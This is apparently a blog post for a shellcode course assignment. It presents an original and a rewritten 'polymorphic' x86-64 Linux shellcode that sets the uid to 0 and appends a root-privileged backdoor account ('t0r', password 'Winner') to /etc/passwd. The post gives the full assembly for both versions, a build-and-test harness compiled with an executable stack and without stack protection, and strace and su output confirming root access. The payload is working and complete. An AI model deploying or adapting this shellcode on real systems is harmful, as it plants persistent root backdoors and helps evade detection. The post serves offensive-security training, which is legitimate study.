---
title: SLAE64 Assignment 6 - Polymorphic SetUID 0 & Add Root User
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the sixth assignment of the SLAE64, I created three polymorphic payloads from shellcodes on shellstorm and the exploit db. This is the second payload, add user `'t0r' with password 'Winner'.

This shellcode did not work when attempting to compile. Diving into the shellcode it looks like the x86 calling convention was used, which obviously caused major problems with the program execution. There was also a stack method used for the strings. Being that this is a "polymorphic" version of the original shellcode, I opted to use the `jmp-call-pop` method to get the address of the strings. I also made various other modifications.

The Original Shellcode was `189 bytes`.  
This polymorphic version of the shellcode is `123 bytes`.  

## Original Shellcode
Before posting this shellcode here, I did clean it up.   
The original shellcode can be found here: http://shell-storm.org/shellcode/files/shellcode-801.php
```nasm
;sc_adduser01.S
;Arch:          x86_64, Linux
;Author:        0_o -- null_null
;           nu11.nu11 [at] yahoo.com
;Date:          2012-03-05
;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
;executed syscalls:     setreuid, setregid, open, write, close, exit
;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
BITS 64
[SECTION .text]
global _start
_start:
;sys_setreuid(uint ruid, uint euid)
xor rax, rax
mov al, 113   ;syscall sys_setreuid
xor rbx, rbx  ;arg 1 -- set real uid to root
mov rcx, rbx  ;arg 2 -- set effective uid to root
syscall
;sys_setregid(uint rgid, uint egid)
xor rax, rax
mov al, 114   ;syscall sys_setregid
xor rbx, rbx  ;arg 1 -- set real uid to root
mov rcx, rbx  ;arg 2 -- set effective uid to root
syscall
;push all strings on the stack prior to file operations.
xor rbx, rbx
mov ebx, 0x647773FF
shr rbx, 8
push rbx                     ; \00dws
mov rbx, 0x7361702f6374652f
push rbx                     ; sap/cte/
mov rbx, 0x0A687361622F6EFF
shr rbx, 8
push rbx                     ; \00\nhsab/n
mov rbx, 0x69622F3A746F6F72
push rbx                     ; ib/:toor
mov rbx, 0x2F3A3A303A303A67
push rbx                     ; /::0:0:g
mov rbx, 0x46556B554B587435
push rbx                     ; FUkUKXt5
mov rbx, 0x546755333A723074
push rbx                     ; TgU3:r0t
;prelude to doing anything useful...
mov rbx, rsp      ;save stack pointer for later use
push rbp          ; base pointer to stack so it can be restored later
mov rbp, rsp      ;set base pointer to current stack pointer
;sys_open(char* fname, int flags, int mode)
sub rsp, 16
mov [rbp - 16], rbx ;store pointer to "t0r..../bash"
mov si, 0x0401    ;arg 2 -- flags
mov rdi, rbx
add rdi, 40       ;arg 1 -- pointer to "/etc/passwd"
xor rax, rax
mov al, 2       ;syscall sys_open
syscall
;sys_write(uint fd, char* buf, uint size)
mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
mov rcx, rbx     ;arg 2 -- load rcx with pointer to string "t0r.../bash"
xor rdx, rdx
mov dl, 39      ;arg 3 -- load rdx with size of string "t0r.../bash\00"
mov rsi, rcx     ;arg 2 -- move to source index register
mov rdi, rax     ;arg 1 -- move to destination index register
xor rax, rax
mov al, 1               ;syscall sys_write
syscall
;sys_close(uint fd)
xor rdi, rdi
mov edi, [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register
xor rax, rax
mov al, 3       ;syscall sys_close
syscall
;sys_exit(int err_code)
xor rax, rax
mov al, 60          ;syscall sys_exit
xor rbx, rbx         ;arg 1 -- error code
syscall
```
## New Polymorphic Shellcode
```nasm
;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
;executed syscalls:     setreuid, setregid, open, write, close, exit
;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
_start:
;sys_setuid(0)
xor rdi, rdi   ;arg 1 -- set uid to root (0)
mul rdi
push rdi
pop rsi
mov al, 0x69   ;syscall setuid
syscall

; int open(const char *pathname, int flags);
jmp short callFileString
popFileString:
pop rdi                  ; ARG1 - pointer to "/etc/passwd"
mov [rdi+0xB], dl        ; Null terminator byte for string

mov si, 0x441            ; ARG2 - flags to open and write
mov al, 2                ; open syscall
syscall                  ; rax=fd for opened file

;sys_write(uint fd, char* buf, uint size)
; rax=0x1   rdi=fd  rsi=&str   rdx=0x26
jmp short callPasswdString
popPasswdString:
pop rsi                  ; ARG2 - &passwdString
mov [rsi+0x26], dl       ; Null terminator byte for string
push rax
pop rdi                  ; ARG1 - fd
add rdx, 0x26            ; ARG3 - len(passwdString)
xor rax, rax
inc rax                  ; 0x1 = write systemcall
syscall

;;close(fd)
xor rax, rax             ; rdi is already the file descriptor
add al, 3                ; 0x3 = close systemcall
syscall

;;sys_exit(int err_code)
xor rax, rax
mov al, 0x3C             ; 0x3C = exit systemcall
xor rdi, rdi             ; ARG1 = Error Code = 0x0
syscall

callFileString:
call popFileString
fileString: db "/etc/passwdA"
callPasswdString:
call popPasswdString
passwdString: db "t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash"
```

## Compilation & Testing
This shellcode is more complex that simply passing the stard output of a bash command to the `/etc/passwd` file, using a system call like `execve`. Instead, this shellcode does it the "proper" way. The shellcode opens the file, get a file-descriptor, writes to the file, and then finally closes the file.  
I am fimilar with this in the Windows x86 architecture, not so much with the Linux x64 architecture. To speed up testing, I build a script that would compile my shellcode, add it to a host C program, and compile the host C program.
### AssembleAndTest.sh
```bash
#!/bin/bash
if [ $# -eq 0 ]; then
    echo 'Usage: '$0' [ASM_FILE.asm]'
    exit
fi
asmFile=$1
noExt=$(echo $asmFile | sed 's/\..*$//g')
objFile=$noExt".o"
echo "[+] Compiling: nasm -f elf64 $asmFile -o $objFile"
nasm -f elf64 $asmFile -o $objFile
echo "[+] Dumping shellcode with objdump"
SHELLCODE=$(for i in $(objdump -D $objFile | grep "^ " | cut -f2); do echo -n '\x'$i; done)
echo 'Creating a host file: shellcode.c & adding your shellcode to it'
echo '#include<stdio.h>' > shellcode.c
echo '#include<string.h>' >> shellcode.c
echo 'unsigned char shellcode[] = \' >> shellcode.c
echo '"'$SHELLCODE'";' >> shellcode.c
echo 'int main()' >> shellcode.c
echo '{' >> shellcode.c
echo '        printf("Shellcode Length:  %d\n", strlen(shellcode));' >> shellcode.c
echo '        int (*ret)() = (int(*)())shellcode;' >> shellcode.c
echo '        ret();' >> shellcode.c
echo '}' >> shellcode.c
echo "compiling the shellcode with: gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode"
gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
echo 'All done!'
ls -l shellcode
```
+ This helped alot. I wish I created it earlier on.

### Compile & Test
Now we will use this handy bash script to quickly get our shellcode ready for testing.
```bash
root# ./assembleAndTest.sh mod-addUserWithPasswd.asm
[+] Compiling: nasm -f elf64 mod-addUserWithPasswd.asm -o mod-addUserWithPasswd.o
[+] Dumping shellcode with objdump
Creating a host file: shellcode.c & adding your shellcode to it
compiling the shellcode with: gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
All done!
-rwxr-xr-x 1 root root 16872 Apr 27 19:52 shellcode
```

### Strace Polymorphic Version
```bash
root# strace ./shellcode
setuid(0)                               = 0
open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 000) = 3
write(3, "t0r:3UgT5tXKUkUFg:0:0::/root:/bi"..., 38) = 38
close(3)                                = 0
exit(0)                                 = ?
+++ exited with 0 +++
```
+ And look at that, what a beauty. 

### Checking `/etc/passwd` & Testing
```bash
root# ./shellcode
Shellcode Length:  123
root# tail -n 1 /etc/passwd
t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
root# echo $$ | xargs ps
    PID TTY      STAT   TIME COMMAND
  14030 pts/1    S      0:00 bash
root# su boku
boku$ su t0r
Password: Winner
root# echo $$ | xargs ps
    PID TTY      STAT   TIME COMMAND
  14685 pts/1    S      0:00 bash
root# id
uid=0(root) gid=0(root) groups=0(root)
```
+ Here we can see that the polymorphic version of the shellcode worked as intended.

